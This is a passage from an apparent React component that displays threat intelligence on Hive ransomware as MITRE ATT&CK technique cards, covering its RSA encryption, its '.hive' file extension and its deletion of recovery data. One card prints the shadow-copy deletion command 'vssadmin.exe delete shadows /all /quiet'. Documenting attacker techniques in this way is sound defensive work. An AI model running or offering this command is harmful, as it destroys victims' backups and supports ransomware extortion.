						<span className='text-dark fw-bold mb-1 fs-3'>- Data Encrypted for Impact</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The threat actors began their final actions by distributing a file named "windows.exe," which was the ransomware payload written in Golang.</div>
					
					
					<div className='fs-2 fw-bold pb-3'>Encryption algorithm</div>
					<div className='ms-5 mb-5'>
						<span className='badge badge-light-info fs-7 fw-bold my-2'>RSA</span>
						<span>&nbsp;&nbsp;</span>
						
					</div>
					<div className='fs-2 fw-bold pb-3'>Added Extension</div>
					<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>.randomstring.hive</div>
						
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1490</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Inhibit System Recovery</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Deleting the shadow copies from the machine to inhibit system recovery</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
							<div>&deg;&nbsp;vssadmin.exe delete shadows /all /quiet</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	</>
  )
}

export {HIVE}
